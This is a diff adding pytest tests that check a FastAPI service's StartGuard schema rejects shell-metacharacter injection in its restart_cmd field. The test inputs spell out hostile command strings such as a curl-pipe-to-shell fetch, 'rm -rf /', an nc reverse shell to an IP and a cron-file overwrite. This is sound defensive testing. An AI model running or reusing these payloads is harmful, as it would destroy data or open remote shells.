@@ -7,6 +7,7 @@
 - nginx 配置路径按路径段比较，拒绝 /etc/nginx-evil 前缀碰撞
 - nginx 读写配置/备份端点要求 admin 及以上权限
 - MCP 配置写入使用原子替换
+- StartGuard.restart_cmd 拒绝 shell 元字符，避免命令链注入（SD7）
 """
 
 import json
@@ -18,6 +19,7 @@ from fastapi.testclient import TestClient
 from app.main import app
 from app.api.v2 import guardian_router, mcp_admin
 from app.models.server_config import ServerConfig
+from app.schema.guardian import StartGuard
 from app.utils.security import verify_token
 
 
@@ -190,3 +192,84 @@ def test_mcp_save_config_is_atomic(tmp_path):
 
     assert json.loads(config_path.read_text(encoding="utf-8")) == payload
     assert list(tmp_path.glob("*.tmp")) == []
+
+
+# ==================== StartGuard restart_cmd 校验 ====================
+
+@pytest.mark.parametrize(
+    "restart_cmd",
+    [
+        "systemctl restart nginx; curl evil.sh | sh",
+        "systemctl restart nginx && rm -rf /",
+        "systemctl restart nginx || nc -e /bin/sh 1.2.3.4 9000",
+        "systemctl restart nginx > /etc/cron.d/pwn",
+        "systemctl restart nginx < /tmp/payload",
+        "systemctl restart $(cat /tmp/cmd)",
+        "systemctl restart `id`",
+        "systemctl restart nginx &",
+        "systemctl restart nginx\nrm -rf /",
+        "systemctl restart nginx\\; ls",
+    ],
+)
+def test_start_guard_rejects_shell_metacharacters(restart_cmd):
+    """命令链、重定向、替换语法都不能进入 create_subprocess_shell。"""
+    with pytest.raises(ValidationError):
+        StartGuard(service_name="web", port=8000, restart_cmd=restart_cmd)
+
+
+@pytest.mark.parametrize("restart_cmd", ["", "   ", "# just a comment"])
+def test_start_guard_rejects_empty_or_comment(restart_cmd):
+    with pytest.raises(ValidationError):
+        StartGuard(service_name="web", port=8000, restart_cmd=restart_cmd)
+
+
+@pytest.mark.parametrize(
+    "restart_cmd",
+    [
+        "systemctl restart nginx",
+        "docker restart my-container",
+        "pm2 restart app",
+        "supervisorctl restart web",
+    ],
+)
+def test_start_guard_accepts_plain_commands(restart_cmd):
+    guard = StartGuard(service_name="web", port=8000, restart_cmd=restart_cmd)
+
+    assert guard.restart_cmd == restart_cmd
+
+
+def test_start_guard_strips_surrounding_whitespace():
+    guard = StartGuard(
+        service_name="web", port=8000, restart_cmd="  systemctl restart nginx  "
+    )
+
+    assert guard.restart_cmd == "systemctl restart nginx"
+
+
+def test_start_guard_endpoint_rejects_metacharacters(monkeypatch):
+    """校验挂在 schema 上，非法命令在进入 handler 前即为 422。
+
+    顺手断言 `get_guardian` 未被调用：一旦校验失效，handler 会真的写
+    `data/service_configs.json` 并启动监控协程，测试必须在这里就拦住。
+    """
+    touched = []
+    monkeypatch.setattr(guardian_router, "get_guardian", lambda: touched.append(1))
+    app.dependency_overrides[verify_token] = lambda: {
+        "sub": "1",
+        "permission_level": "superadmin",
+    }
+    try:
+        client = TestClient(app)
+        resp = client.post(
+            "/api/v2/Controller/guard/start",
+            json={
+                "service_name": "web",
+                "port": 8000,
+                "restart_cmd": "systemctl restart nginx; rm -rf /",
+            },
+        )
+    finally:
+        app.dependency_overrides.clear()
+
+    assert resp.status_code == 422
+    assert touched == []
